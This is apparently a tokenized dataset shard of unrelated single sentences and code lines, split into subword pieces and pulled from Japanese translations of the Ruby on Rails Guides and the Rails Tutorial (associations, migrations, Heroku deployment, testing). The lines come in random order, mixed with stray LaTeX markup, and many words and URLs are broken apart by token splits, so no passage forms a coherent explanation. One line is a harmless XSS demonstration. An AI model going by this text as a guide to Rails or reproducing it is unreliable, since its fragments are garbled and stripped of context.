▁` has _ many ` 関連付け に オブジェクトを ア サ イン すると 、 外部キー を更新する ために そのオブジェクト は自動的に 保存されます 。
▁$ ▁git ▁push ▁ heroku
▁ dup [: b ] [: d ] ▁<< ▁5
▁ エンジン 内の 他の コンポーネント と同様 、 アセット も 名前空間化され る必要があります 。
▁(\ k ode { has _ secure _ password } の実装 に 興 味 のある 方は 、\ href { https :// github ▖ com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password ▖ rb }{\ text tt { secure _ password ▖ rb } の ソースコード } を参照 してみる と よいでしょう ▟ この ソースコード には 十分 な 解説 があり 、 しかも 読みやすく でき ています 。
▁GitHub から Ruby ▁on ▁Rails に 送信された プルリクエスト ▁( pull ▁request 、 プ ル リ ク とも ) ▁ を チェック してくれる 人 も い ると 助 か ります 。
▁これは \ emph { system } セットアップ と呼ばれ 、 使用する コンピュータ 1 台 に つ き 1 回 だけ 行います 。
▁### ▁` content _ for ` を使用する
▁ データベースから 取り出し た ユーザーの 一覧 を User モデル から コントローラに 返す 。
▁secure _ password の ソースコード には 以下の行 があります 。
▁まずは 、\ k ode { site \_ layout } という テストの テンプレート を生成する ところから始め て みます 。
▁first ▖ last @ foo ▖ jp
▁図 \ ref { fig : activated _ user } の ようになりました 。
▁* ▁` ActiveSupport :: Logger ▖ silencer ` を ` false ` に設定する と 、 ブロック 内で の ログ出力 を 抑 制 する 機能 が オフ になります 。
▁" Product "▖ demodulize ▁# ▁=> ▁" Product "
▁上の例では 、 昨 日 作成された すべての クライアント を検索し ます ▟ 内部で は SQL の ` BETWEEN ` 文 が使用されます 。
▁#### ▁JRuby プラットフォーム で SQLite 3 データベース を設定する
▁ここで 注意 して 頂 き たい のは 、 表 \ ref { table : RESTful _ users } では ユーザー編集ページ の 正しい URL が / users /1/ edit となっている ことです ▁( ユーザーの id が \ text tt {1} の場合 ) 。
▁ 管理ユーザー 向 け の ファクトリー を追加する 。
▁### ▁ 健 全 性 チェック
▁リスト \ ref { code : micropost _ form } の フォーム が 動く ように するためには 、2 箇所 の 変更 が必要です 。
▁=> ▁1
▁ ところで 、 サンプルアプリケーション を Heroku に 本番 展開 した 場合は 、\ text tt { heroku } コマンドで 環境 を確認する ことができます ▟ これを行うには 、 Heroku の ▁( リモート ) ▁ コンソール で 以下を実行し ます 。
▁a 2▖ x ▁# ▁=> ▁2 ▁( a 2 で オーバーライド される )
▁` assert _ tag ` など を含む [ ` T a g Assertion s ` モジュール ]( http :// api ▖ rubyonrails ▖ org / classes / ActionDispatch / Assertion s / T a g Assertion s ▖ html ) は [ 非推奨 ]( https :// github ▖ com / rails / rails / blo b / 6 06 14 7 2 b 8 c 3 10 1 58 a 2 a 2 e 8 e 9 a 6 b 8 1 a 1 a e f 6 b 60 fe / actionpack / lib / action _ dispatch / testing / assert ion s / dom ▖ rb ) になりました ▟ 今後 推 奨 される のは 、 ActionView から [ rails - dom - testing ▁gem ]( https :// github ▖ com / rails / rails - dom - testing ) に 移 行 した ` S el ec to r Assertion s ` モジュール の ` assert _ select ` メソッドです 。
▁この 表示 は 、\ k ode { rdoc } 形式 が Bitbucket では 標準 の README として サポート されていない ために 起こ ります ▟ 実 の ところ 、 著者 も含め ほとんどの 開発者 は \ emph { Markdown } 形式 を使用しています 。
▁[ ▁ Proc ▖ new ▁ { ▁| filename , ▁path | ▁path ▁= ~ ▁ / app \ / assets / ▁&& ▁ !
▁それでは 、 最初に 最小限 の \ k ode { create } アクションを Sessions コントローラで 定義 し 、 空の \ k ode { new } アクションと \ k ode { destroy } アクション も つ い で に 作成 しておきましょう ▁( リスト \ ref { code : initial _ create _ session }) 。
▁ 孤 立 した レコードが データベースに 残 っ てしまう 可能性があります 。
▁ そう ではなく 、 真 の Rails \ emph { エ キ ス パ ート } になり たい のであれば 、 Ruby を さらに 深 い レベル まで 理解 する必要があります ▟ 本書 は 、 そのため の開発 技術 の基礎 を 築 く 助 け になる でしょう 。
▁ これはリスト \ ref { code : real _ account _ activation _ test } で使用されていました 。
▁\ k ode { has \_ many } メソッド には 、 クラス名 や 外部キー など 、 い く つ もの オプションを 渡す ことができる ▟ たとえば
▁( この後 の 章 でも 多くの 実 例を 紹介します ) 。
▁` where ` 条件 が ない場合は 、 通常の クエリ が 2 セット 生成されます 。
▁create ▁app / assets / javascripts / application ▖ js
▁belongs _ to ▁: ph y s ic i an
▁\ ref { sec : repository _ host } の 手順 に 沿 って 進 め た場合 、\ k ode { README ▖ rdoc } ファイル が自動的に 認 識 され ず 、 README がない という メッセージ が表示される ことに 気 付 いた でしょう ▁( 図 \ ref { fig : bitbucket _ no _ readme }) 。
▁* ▁` active _ support ▖ initialize _ beginning _ of _ week `: ▁` config ▖ beginning _ of _ week ` の設定 に基づいて アプリケーションの デフォルトの 週 開 始 日 を設定します ▟ デフォルト値 は `: monday ` です 。
▁もちろん 、 リスト \ ref { code : users _ migration } の \ k ode { users } テーブル 用の マイグレーション ファイルを 単 に 編集 すること も 可能な のですが 、 その 場合 ロールバック が必要 となり 、 マイグレーション が 戻 ってしまいます 。
▁### ▁`: if ` や `: unless ` で 文字列 を使用する
▁* ▁` config ▖ assets ▖ precompile ` は 、` application ▖ css ` と ` application ▖ js ` 以外に 追加 したい アセット がある場合 に 指定します ▟ これらは ` rake ▁assets : precompile ` を実行する ときに 一 緒 に プリコンパイル されます 。
▁この ディレクトリ には ` bin / rails ` という ファイルが 1 つだけ 置かれ ます ▟ これは アプリケーション 内で 使用している の と 似 た ` rails ` サブ コマンド であり 、 ジェネレータ です 。
▁( 注 : ▁\ k ode { form \_ for } の代わりに \ k ode { form \_ tag } を使う ことも でき 、 Rails では この 方が 慣 用 的な 方法 です ▟ しかし 、 ユーザー登録フォーム では form _ for を使用する 方が 一般的 であり 、 並 列 構造 を 強 調 するために も form _ for を使用しました 。
▁# ▁ ActionDispatch :: ShowExceptions を Lifo :: ShowExceptions で 置き換え る
▁ ハッシュ は 、 本質的に は 配列 と同じ ですが 、 インデックス として 整 数値 以外の もの も 使用できる 点が 配列 と 異なります
▁リスト \ ref { code : user _ activation _ methods } では \ k ode { user ▖ } という 記 法 を使用して いない ことにご注目ください ▟ User モデル には そのような 変数 は ないので 、 これ があると エラー になります 。
▁` welcome ` コントローラで 行った ときと同様 、` comments ` を参照 するために Rails が 知 っ ておく べ き ルーティング を追加する 必要があります 。
▁ 今回 も いつものように テスト を作成する ところから始め ます 。
▁上 で紹介した その他の バリデーション については 、 特定の 状 況 に応じて 適 宜 追加 してください 。
▁config ▖ action _ dispatch ▖ default _ headers ▖ clear
▁ 実は 、 上のコード は 引数 なしで 動作 していました ▟ これは \ k ode { will \_ paginate } が 、 Users コントローラの コンテキスト において 、\ k ode {@ users } インスタンス変数 が存在し ていること を \ emph { 前提と している } ためです ▟ この インスタンス変数 は 、\ ref { sec : pagination } でも 述べたように \ k ode { ActiveRecord :: Relation } クラス のインスタンス です 。
▁Active ▁Record の `: inverse _ of ` オプション を使用すれば これらの 関係 を 通知 することができます 。
▁従って 、 この 結果は そのまま クエリ 文字列 として 使用できます 。
▁#### ▁ 期間
▁` t ▖ references ` という 書 式 を使用すると さらに シ ン プ ル に できます 。
▁get ▁' photos / : id ', ▁to : ▁' photos # show '
▁id = \ k ode {1} のユーザー を更新する アクション
▁< option ▁value =" 1 "> E g y p t </ option >
▁ 引数に \ emph { デフォルト } 値 を含め ている からです ▁( この 例 のデフォルト 値は 空の 文字列 です ) 。
▁たとえば 次のようになります 。
▁ユーザーの \ k ode { update } アクション
▁ 正しく インストール された かどうかを確認 するには 、 以下のコマンドを実行し て バージョン を 確認してください 。
▁` present ?` メソッドは ` ! blank ?` メソッドと 同等です 。
▁ ルーティング ファイルに 以下 が 記載 されている とします 。
▁### ▁ 動的 コンパイル
▁` parameterize ` メソッドは 、 レシーバ を 正しい URL で 使用 可能な 形式 に 正 規 化 します 。
▁ アプリケーションの コード や 実行 環境 を セキュア に する方法 については 、 本ガイド の 範 疇 を 超 えます 。
▁上の テストにパス するための 以下の コントローラ のコードは 、 驚 く ほど 簡潔 です ▟ 単 に 、 フォローしているユーザー または これ から フォローする ユーザー を取り出し 、 関連する ユーティリティ メソッドを使用して それら を フォロー または フォロー解除 している だけです 。
▁\ href { http :// localhost :3000/ microposts / new }{/ microposts / new } ページ をブラウザで開き 、 新しいマイクロポスト の 情報を 入力 して マイクロポスト をいくつか 作成 してみましょう ▁({1}{2} 図 2▖1 2 {/2}{/1} ) 。
▁これは Factory ▁Girl に 問題 がある わ け ではなく 、 あくまで \ emph { 機能 } の一部 であり 、 バグ ではありません 。
▁\ k ode { length } のように 、 インスタンス に対して 呼び出す メソッドは \ emph { インスタンス メソッド } と呼ばれ ます 。
▁上のように 変更 することで 、 `@ products ` コレクション のインスタンス に ` item ` という名前の ローカル変数 経由で アクセス できます 。
▁ デフォルトの ヘッダー
▁ 現時点の 状態 で フォーム を再度 送信する と 、` show ` アクション がない という メッセージ が Rails から 返 されます 。
▁この ディレクトリ 名 と ファイル名 は 、 どちらも 重要です 。
▁#### # ▁`: as `
▁ 詳 しく は RailsCast の ▁“ \ href { http :// r ailscasts ▖ com / episodes / 7 7 - destroy - with out - javascript } { JavaScript を 使わない 削除 } ” ▁( 英語 ) ▁ を 観 てください 。
▁ この時点で 、 アプリケーションは 重要な 警 告 と 共 に メールアドレス の 一意性 を 強 制 し 、 テストスイート も パスするはずです 。
▁` new ` メソッド を使用した 場合は 、 オブジェクトは 保存 され ずに インスタンス化され ます 。
▁ただし 、 残念ながら デフォルトの 順序 が \ emph { 昇 順 } となっている ので 、 このままでは 数 の 小さい 値 から 大 き い 値 に ソ ート されてしまいます ▁( 最も 古 い 投 稿 が 最初に 表示 されてしまいます ) 。
▁#### # ▁` DateTime ▖ current `
▁ この問題 の 根 本 は 、 必要な 抽 象 化 を 行 な って いない ことです 。
▁ 実際の パラメータ が どのように な っている か を確認する ために 、` create ` アクションに 以下の 変更 を加え てみましょう 。
▁User ▖ find _ each ( batch _ size : ▁5 000 ) ▁do ▁| user |
▁ それ に 続いて ルート URL にリダイレクトし 、 フラッシュメッセージ を ユーザーに 表示 します 。
▁{0} 図 9 ▖4{/0}{1} \ href { http :// gravatar ▖ com /}{ Gravatar } の 画像 調 整 インターフェイス ▁( 写 真 は \ href { http :// www ▖ michael hartl ▖ com /}{ 誰 か さ ん }) {/1} 。
▁ スコープ には 引数 を渡すことができます 。
▁\ k ode { name } 属性 の検証 に対する 、 失敗する テスト 。
▁今度は 、 ページ 間 を 移動 するための リンクを 追加 してみましょう 。
▁ただし 、 Web サイト を ス ケ ー ル \ emph { させる } ことは 、 Rails ▁ だけで 出 来 ること ではありません ▟ Rails ▁ 以外の 知識 も 必要 になります ▟ と い って も 、 H ul u ▁ や ▁ Y ellow ▁Pages ▁ といった 大量の トラフィック を 捌 い ている Web アプリケーション も ▁Rails ▁ で 構 築 されているので 、 そこ まで 心 配 する必要はありません ▟ 少なくとも 、\ emph { あなた の } アプリケーションが ▁H ul u ▁ や ▁ Y ellow ▁Pages ▁ 並 み に 成 長 する まで の 間 は 、「 Rails ▁ だ から ス ケ ー ル できない 」 ということ に はならない でしょう 。
▁S trong ▁Parameters 、 再び
▁# ▁ ここに 例外 処理 を書く
▁上のコードでは 、 最初に クライアント を 10 人 検索 するのに クエリ を 1 回 発行し 、 次に そこ から 住 所 を 取り出す の に クエリ を 10 回 発行し ます ので 、 合 計 で ▁** 11 ** ▁ 回 の クエリ が 発 行 されます 。
▁また 、 一 般 の Ruby 入 門 書 で 扱 っている 内容 とも 多少 異 なっています 。
▁以前のバージョン の Rails では 、\ k ode { モデル } 層 で \ emph { attr _ accessible } メソッドを使用することで 上のような 危 険 を 防止 していました が 、 ▁Rails ▁4▖0 では コントローラ 層 で \ emph { S trong ▁Parameters } という テクニック を使用すること が 推 奨 されています 。
▁ { id : ▁ 89 , ▁name : ▁" John ▁S m i th "} ▖ to _ query (' user ')
▁ 数値 を パ ー セ ン ト 文字列に変換 します 。
▁get ▁' two ' ▁=> ▁' test # example ', ▁as : ▁: example
▁Rack は HTTP リクエスト と レスポンス を 可能な か ぎ り 簡単な 方法で ラ ッ ピ ング することで 、 ウェブ サーバー 、 ウェブ フレームワーク 、 その 間 に 位 置 する ソフトウェア ▁( ミドルウェア と呼ばれ ています ) ▁ の API を 一 つの メソッド呼び出し の 形 に まとめ ます 。
▁続いて リモート リポジトリ に プッシュ し 、 Heroku に デプロイ します 。
▁* ▁ compiled ▁file , ▁but ▁it ' s ▁generally ▁better ▁to ▁create ▁a ▁new ▁file ▁per ▁style
▁ 定数名 は シンボル として 返 されます 。
▁### ▁ ハッシュ を使用した 条件
▁\ href { http :// a w s ▖ a mazon ▖ com /}{ A mazon ▁Web ▁S er v ice s } アカウント に サインアップ する
▁もし この ステップ が 摩訶 不思議 に 思 え たら 、 次のように 考えてみましょう ▟ 「 私 は ただ \ href { https :// github ▖ com / t w b s / bootstrap - sass } { bootstrap - sass の README ファイル } に従って い る の だ 」 と 。
▁H i , ▁M r ▖ ▁<% ▁ puts ▁" F r o do " ▁%>
▁{0} リスト 2▖ 8 {/0} ▁╼╼{1} Rails ルート で使用する Microposts リソース 用の ルール {2} {/2} ▁ {3} config / routes ▖ rb {/3} {/1}
▁HTTP の PUT メソッド 、 DELETE メソッドを 実現 するための ミドルウェア です 。
▁この 指定 を 外 す 際 は 、 必ず コア チーム の 誰 か か コードの 著者 に 相 談 してから に してください 。
▁ 手 強 い 課題 に 挑 む のです から 、 ここで 実装 すべき 内容 を 慎 重 に 見 直 す こと が重要です 。
▁ 以前 は このような 引数 を使用すると ` ActiveRecord :: As so ci ation Type M is match ` 例外 が発生し ました 。
▁ これを行うには 、 以下の よう に記述 します 。
▁self を省略した 結果を リスト \ ref { code : close _ route } に示します 。
▁1234567890 ▖ to _ s (: human ) ▁# ▁=> ▁" 1▖23 ▁B illion "
▁まずは \ k ode { get } メソッドを使って ユーザー登録ページ にアクセス します 。
▁ アプリケーションの コード は既に 動作する ようになってい るので 、 ここで テスト を実行すると ▁\ passing ▁ になるはずです 。
▁\ label { cha : rails _ flavored _ ruby }
▁NOTE : ▁このオプション を指定して も 、 実際の アクション 名 が変更され る わけではありません 。
▁ このような 問題 が発生し た場合 は 、 アプリケーションの ルーティング メソッドを 、` main _ app ` という プレフィックス を付け ずに エンジン から 呼 び だ そう と していない かどうかを確認 してください 。
▁ 静的なページ のルーティング 一覧
▁` config ▖ cache _ classes ` が オン の場合は この オプションは 無視 されます 。
▁| ▁| ▁30 6 ▁| ▁: re serv ed ▁|
▁Web アプリケーションの 場合 、「 ドメイン ロ ジ ッ ク 」 は ユーザー や 記事 、 商 品 などの データモデル に相当 し 、 ユーザー インターフェイス は Web ページ を指します 。
▁ curl を使用して 、 サーバー と CDN に それぞれ リクエストを送信し 、 ヘッダー が 同じ である かどうかを 以下のように 確 認 できます 。
▁リスト \ ref { code : password _ reset _ update _ action } の テンプレート を 埋 めて 、 期限切れ の パスワード再設定の ブランチ ▁( リスト \ ref { code : password _ reset _ expire _ test }) ▁ の 統合テスト を作成してください
▁この アプリケーション に必要な Gem の 定義ファイル
▁ ちなみに 、 ここに flash のテスト も 追加 して おくとよいでしょう ▟ これは 演習 として 残しておきます ▁(\ ref { sec : signup _ exercises }) 。
▁# ruby - gem set = railstutorial _ rails _4_0
▁ 一般に 、 セキュリティ 修正 と バグ 修正 は 、 バックポート の 候 補 になります ▟ 新 機能 や 動作 変更 用 パッチ は バックポート の 候 補 には 採 り 入 れ ら れ ません 。
▁ 実際に 体 験 し てもらう ために 、 今回は テスト駆動開発 を使って ユーザーの 編集 機能を実装し てみましょう 。
▁ ブログ エンジン で 最初に 生成 すべき は ` Article ` モデルと それ に関連する コントローラ です 。
▁` belongs _ to ` 関連付けを 宣言 したら 、 対応する 外部キー を作成する必要があります 。
▁ パーシャル レイアウト
▁ ユーザーは 、 編集 フォーム から \ text tt { PATCH } リクエストを \ k ode { update } アクション に対して 送信 し 、 情報 を更新する
▁ デフォルトの Rails フォルダ 構造 まとめ 。
▁ リダイレクト 先 を ルート URL に変更し て あります 。
▁ メソッドに 引数 が渡され ない場合 、 この メソッド呼び出し は 、 一連の キー / 値 ペ ア を ソ ート 済み の 形で 生成 し 、 それぞれの 値 に対して ` to _ query ( key ) ` を呼び出します 。
▁Microposts リソース が提供する リスト \ ref { code : microposts _ resource } の RESTful ルート
▁ CarrierWave を使うと 画像アップロード や 画像 リ サイズ が できる
▁ これはリスト \ ref { code : errors _ partial } で使用されていました 。
▁* ▁`: association _ foreign _ key `
▁2 つの モデル で 行われている これらの 宣言 によって 、 さまざまな 動作 が 自動化 されています 。
▁この オブジェクトは 、 渡された 属性 を使用して インスタンス化され 、 そのオブジェクト の 外部キー を 介 して リンク が 作成されます ▟ そして 、 関連付けられた モデル で指定されている 検証 がすべて パス すると 、 この 関連付けられたオブジェクト は 保存されます 。
▁\ k ode { remember _ token } を \ k ode { users } テーブルに 追加 した マイグレーション 。
▁* ▁ メモリ による キャッシュ を行う ために 使用します 。
▁ここで ` render ` メソッド を使用する 理由は 、 ビューの ` new ` テンプレート が 描画 された ときに 、 `@ article ` オブジェクトが ビューの ` new ` テンプレート に 返される ように する ためです 。
▁デフォルトでは アプリケーションの ` app ` ディレクトリ 以下の すべての ディレクトリ が 対象 です 。
▁class _ name : ▁" M y Application :: Billing :: Account "
▁" equipment "▖ singularize ▁# ▁=> ▁" equipment "
▁ すなわち このテストは 、 ユーザ 数を 覚え た 後に 、 データを 投 稿 してみ て 、 ユーザ 数 が 変 わ らない かどうか を検証する テスト になります ▟ したがって 、 以下のコード と 等 価 になります 。
▁これで すべての 部品 が 定 位 置 に置かれ 、 ある 記事 ▁( article ) ▁ を 、` users ` テーブルの レコード で 表 される 作 者 ▁( author ) ▁ に 関連付け る アクション が 実行される ようになりました ▟ この 記事 は ` blorgh _ articles ` テーブル で 表 されます 。
▁ まとめると 、 第 \ ref { cha : modeling _ users } 章 から 第 \ ref { cha : password _ reset } 章 を通して 、 Rails の ログイン と 認証システムを ひ と とおり 開発 します 。
▁ 属性 が追加された レコード は 常に 読み出し 専 用 になります ▟ このように して 読み 出 された 属性 に対する 変更 は 保存 できない ためです 。
▁* ▁Rails ▁4▖0 では 、 カラム や テーブル の名前 を変更する と 、 関連する インデックス も 自動的に リ ネ ーム される ようになりました 。
▁=> ▁#< User ▁id : ▁nil , ▁name : ▁" Michael ▁Hartl ", ▁email : ▁" mhartl @ example ▖ com ",
▁最後に 、\ k ode { Proc file } と呼ばれる 、 Heroku 上で Puma の プロセス を 走 ら せる 設定ファイル を作成します ▁( リスト \ ref { code : proc file }) 。
▁ 急 い で 学 び たい 人 のための Unix コマンドライン 講 座
▁ 私 が 前に いた 会 社 ▁( C D ▁B a by ) ▁ は 、 かなり 早い 段階で Ruby ▁on ▁Rails に 乗 り 換 え た のですが 、 また P H P に 戻 っ てしまい ました ▁( 詳細は 私 の名前 を Google で 検索 してみてください ) 。
▁record ▖ errors [: base ] ▁<< ▁" これは 悪 人 だ "
▁ ネスト や 変数 を使って 初期 の SCSS ファイルを 書き 直 した結果
▁( クラウド IDE を ご 利用 の場合は 、 touch で ファイル 作成 後に \ ref { sec : bundler } のように ファイル ツリー の 更新 が 必要な 場合 があります ) 。
▁ Migration ▁with ▁the ▁same ▁name ▁already ▁exists ▖
▁`: validate ` オプションを ` true ` に設定する と 、 関連付けられたオブジェクト が 保存 時に 必ず 検証 ( validation ) されます 。
▁ umerate }╼╼ ▁% ▁subsection ▁sample _ users ▁( end )╼╼ ▁\ subsection { ページネーション } ▁% ▁( fold )╼ ▁\ label { sec : pagination }╼╼
▁ ある モデルのインスタンス を パーシャル として レンダリング する のであれば 、 以下のような 略 記 法 を使用できます 。
▁デフォルトでは false であり 、 この場合 リモート フォーム には ` authenticity _ token ` フォーム が含まれ ません ▟ これは フォーム で フラグ メ ン ト キャッシュ を使用している場合 に 便利です 。
▁{0} 図 9 ▖ 12 {/0} {1} 削除リンク を追加した ユーザー インデックス のモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / user _ index _ delete _ links _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁<%= ▁ video _ tag ▁[" t ra ile r ▖ ogg ", ▁" mov i e ▖ ogg "] ▁%>
▁このヘルパーは 、` with ` オプションで 与えられた 正規表現 と 属性の値 が マッチする かどうか をテストする ことによって バリデーション を行います 。
▁**` ActiveRecord :: Migration :: C h ec k P end ing ` **
▁rails - flavored - ruby
▁class ▁A ▁< ▁B ; ▁end
▁` has _ and _ belongs _ to _ many ` 関連付け では 以下の オプション が サポート されます 。
▁< script > alert (' Hello ! ')
▁Git ▁ を バージョン管理 に 使 っている 場合は 、 いつものように トピックブランチを作成 しておきましょう 。
▁# ▁ SELECT ▁" users "▖
▁これは いずれ の場合 において も 重大な バグ です ▟ ▁ _ ヘッダー インジェクション と レスポンス 分割 の 可能性 を 排 除 する ため 、 Rails を 2▖0▖ 5 または 2▖1 ▖ 2 に アップグレード する必要があります 。
▁ ここ から 3 つの 章 に わ た る 最 終 目標は ユーザー登録ページ ▁( 図 \ ref { fig : signup _ mockup _ preview } のモックアップ ) ▁ を作成する ことです が 、 今 のまま では 新しい ユーザーの 情報 を受け 取 って も 保存 する 場所 が ないので 、 い き なり ページ を作成する わ け には い き ません 。
▁unless ▁value ▁= ~ ▁ / \ A ( [ ^ @ \ s ] + ) @ ( ( ? : [ - a - z 0 - 9 ] + \ ▖) + [ a - z ] { 2, }) \ z / i
▁` dependent : ▁: destroy ` で 関連付けられたオブジェクト がある場合 は 、 それらの オブジェクトは destroy されます ▟ ` dependent : ▁: delete _ all ` で 関連付けられたオブジェクト がある場合 は 、 データベースから 直接 delete されます ▟ それ以外の 場合は 単 に 外部キー が ` NULL ` に設定されます 。
▁ まず 、 ユーザーインデックスページ の各 ユーザーに 削除 用の リンク を追加し 、 続いて 管理ユーザー へのアクセス を 制限 します 。
▁ 別の 文字 セット を定義し たい場合 や 、 事前 に 手動で 別の エンコード を行って お き たい場合 などの 複雑な 事例 については 、[ Mail ]( https :// github ▖ com / m i k el / mail ) ライブラリ を参照してください 。
▁ 開発 時に のみ 必要となる gem は 、 エンジンの テスト 実行 中に のみ 使用されます 。
▁* ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' pending ' ▁ AND ▁" users "▖" state " ▁= ▁' active '
▁ 開発環境 のテスト を 繰り返す ばかり で 、 い つ まで も 本番環境 に デプロイ しない まま だと 、 アプリケーションを 公開 する ぎ り ぎ り の 時 になって 思 わ ぬ 事 態 に 遭遇 する 可能性 が 高 まり ます
▁このコードは リスト \ ref { code : static _ page _ routes } で使用されていました ▟ もうひとつ 、
▁" t ru th y " のような 用 語 は 避 け てください ▟ Ruby では 言語 レベルで true と false が 定義されている ので 、 これらの 用 語 は 技術 的に 厳 密 な 意味 が与えられ ており 、 言い 方 を 変 え る 必要はありません 。
▁text area タグ で テキスト 入力 エリア を作成します ▟ ブログ への 投 稿 や 説明 文 などの 長い テキスト を入力する には text area を ご 使用 ください 。
▁< a ▁ href ="/ articles /1 " ▁data - remote =" true "> an ▁article </ a >
▁この CSS は 、 エラー を含む フィールド を 赤 い 枠 で 囲 みます 。
▁ユーザーの サインイン をテストする Cucumber の フィーチャー ファイル 。
▁XSS 対応策 で 既に 述 べ た とおり 、 _ RedCloth は 必ず ホワイトリスト フィルタ と 組み合わせ て 使用 してください _ ▁ 。
▁$ ▁p kill ▁- 15 ▁- f ▁ spring
▁これで 、` sqlite 3 ` で 行った 場合 と同様に テストを実行 できるようになります 。
▁最後に 、 リスト \ ref { code : signup _ with _ account _ activation _ test } で コメントアウト して お いた 行 を リスト \ ref { code : comment _ out _ failing _ tests } で 元に戻 している ことにご注意ください 。
▁このセクションでは 以後 、 ユーザー に関連する ページ について 手 短 に 説明します 。
▁この 不 便 さ を 取り除く ために 、\ href { https :// github ▖ com / guard / guard }{\ emph { Guard } } を使って テスト を自動的に 実行 させる ように してみましょう 。
▁ そ ろ そ ろ 、 より 快 適 に テストを するためには 、 アプリケーション 用の コードを 「 実装 する 前に 」 統合テスト を 書いた 方が 便 利 だと 気 付 いた 読者 も い る かもしれません 。
▁CSS ファイルの 最小化 は 、 ホワイトスペース と コメント を削除する ことによって 行われます 。
▁もちろん 、 Ruby では 戻り値 を明示的に指定 することもできます ▟ 以下の 関数 は 上の 関数 と同じ 結果 を返します 。
▁self を省略した 結果を リスト \ ref { code : user _ model _ forget } に示します 。
▁-> ▁0▖0 0 17 s
▁config ▖ console ▁= ▁P ry
▁config ▖ action _ controller ▖ asset _ host ▁= ▁' my cdn subdomain ▖ fi ctional - cdn ▖ com '
▁### ▁RESTful な アクションを さらに 追加する
▁scope ▁: active , ▁-> ▁ { ▁where ▁state : ▁' active ' ▁ }
▁これらの 追加 的な チェック 機能を まとめると 、 リスト \ ref { code : jquery _ file _ test } のようになります 。
▁ 関連付け には どんな 名前 でも 使用できる とは限りません 。
▁module _ name ▁= ▁name ▖ s ub ( / Controller $ / , ▁ '')
▁Action ▁Mailer は 、 メールの ヘッダー や 本 文 の マルチ バ イ ト 文字 を自動的に エンコード します 。
▁Action ▁Mailer
▁ s ▁# ▁=> ▁"< script > ▖▖▖ </ script > "
▁この 定義 を行なう ために 、` app / models / blorgh / article ▖ rb ` を開いて モデルに 以下の行 を追加します 。
▁ listing }╼╼\ subsection { ログイン 状態 の 保 持 } ▁% ▁( fold )╼\ label { sec : login _ with _ remember ing }╼╼
▁ 残 す ところ は 、 ユーザーを お 互 い に フォローする ソーシャル な 仕 組み のみ となります 。
▁ セッション を破棄する ▁( ユーザー ログアウト )
▁次に 、 Rails の \ k ode { default \_ scope } メソッドを使って この テストを 成功 させ ます ▟ このメソッドは 、 データベースから 要素 を取得し たとき の 、 デフォルトの 順序 を指定する メソッドです 。
▁以下の 書き 方は 危 険 であり 、 避ける 必要があります 。
▁たとえば 、 ファイル キャッシュストア では 以下のように 非 直 列 化 ▁( de serialize ) ▁ します 。
▁$ ▁rake ▁db : migrate ▁ VERSION = 0
▁end { enumerate }╼╼ ▁% ▁subsection ▁the _ flash ▁( end )╼╼ ▁\ subsection { 実際の ユーザー登録 } ▁% ▁( fold )╼ ▁\ label { sec : the _ first _ signup }╼╼
▁| ▁| ▁50 2 ▁| ▁: bad _ g ate way ▁|
▁self を省略した 結果を リスト \ ref { code : relationships _ migration } に示します 。
▁続いて 、 Home ページ 、 Help ページ 、 About ページ に使用する アクション も それぞれ 作成する ことに し 、 アクション 名 はすべて 小文字 の \ k ode { home }、\ k ode { help }、\ k ode { about } に します 。
▁ 記憶トークン が 有効 である ▁( 空欄 の ない ) ▁ こと をテストする 。
▁ / microposts
▁この 記事 の 執 筆 時点 では 、 この バージョンの 違い は 影 響 していません ▟ ただし 、 今後 Rails のバージョン が 本書 指定 の もの から 離 れ て い く に つ れ 、 バージョンの 違い による 影 響 が 顕 著 になる 可能性があります 。
▁リスト \ ref { code : micropost _ dependency } のコード が正しく 動 い ていれば 、 テストが {2}{3}{/3}{3}{4} 成功 {/4}{/3}{3}{/3} するようになります ▟ {/2}
▁まずは 、\ k ode { site _ layout } という テストの テンプレート を生成する ところから始め て みます 。
▁この場合 、` create ` で パラメータを 安全 に使用する ために 、` title ` と ` text ` パラメータ の 利用 を 「 許可 」 し 、 かつ 「 必 須 」 であること を 指定した い のです 。
▁### ▁Ruby ▁on ▁Rails アプリケーションで Active ▁Support を使用する
▁ アカウント有効化 の実装 が完了し 、 ユーザーの メールアドレスが 正しい ことを確認 できる ようになった ので 、 今度は ユーザーが パスワードを 忘れ てしまった 場合に 対応 できるように しましょう 。
▁ここでは \ href { http :// gravatar ▖ com /}{ Gravatar ▁( global ly ▁recognize d ▁ avatar ) ▁ } を ユーザープロファイル に 導 入 してみましょう
▁SQLite の代わりに PostgreSQL を使う 場合 の \ k ode { Gemfile } 。
▁( リンク 先 の 節 でも 述 べ ている ように 、\ href { http :// git - s cm ▖ com / book / en / getting - started - installing - git }{\ emph { Pro ▁Git } の 「 Git のインストール }」 の 記載 に従う ことになります ) 。
▁\ subsection { Micropost のバリデーション } ▁% ▁( fold )╼ ▁\ label { sec : micropost _ validations }╼╼
▁ RVM ▁Bundler ▁ の 統合
▁( もちろん 、 サブ セレクト を使用すれば い く ら でも ス ケ ー ル アップ できる など という ことはありません 。
▁| ▁`: last _ word _ connect or ` ▁| ▁` support ▖ array ▖ last _ word _ connect or ` ▁|
▁このメソッドは 引数 を ** 取り ません ** 。
▁上のように 、 引数 で \ k ode { TE ST } に テスト ファイルの フルパス を与える と 、 その テスト ファイル だけ を 実行 できます 。
▁render ▁xml : ▁ photo , ▁location : ▁ photo _ url ( photo )
▁ ユーザーが 破棄され た場合 、 ユーザーのマイクロポスト も同様に 破棄され る べ き です 。
▁なお 、 Web ページ への 出力結果 の 最 初 と 最 後 から ホワイトスペース を 取り 除 き たい場合は ` < % - ` ▁ および ▁` - % >` を 通常の ` < % ` ▁ および ▁` % >` と 交 互 に ご 使用 ください ▁( 訳 注 : ▁これは 英語 のような スペース 分 か ち 書き を行なう 言語 向 け の ノ ウ ハ ウ です ) 。
▁#### ▁ パーシャル を 活用 して ビューを 簡潔 に 保 つ
▁method : ▁: delete ,
▁ サンプルアプリケーション 向 け に 書き 換 え た \ k ode { README }
▁User メイラー のテスト ▁( Rails による 自動生成 )
▁ 本 節 の 終わり まで に 、 3 つの 静的ページ の タイトル を 「 < ページ 名 > ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App 」 という 形式 に 変更します ▟ 「 < ページ 名 > 」 の 部分 が ページ に応じて 変 わ ります ▁( 表 \ ref { table : static _ pages }) 。
▁invoke ▁ scss
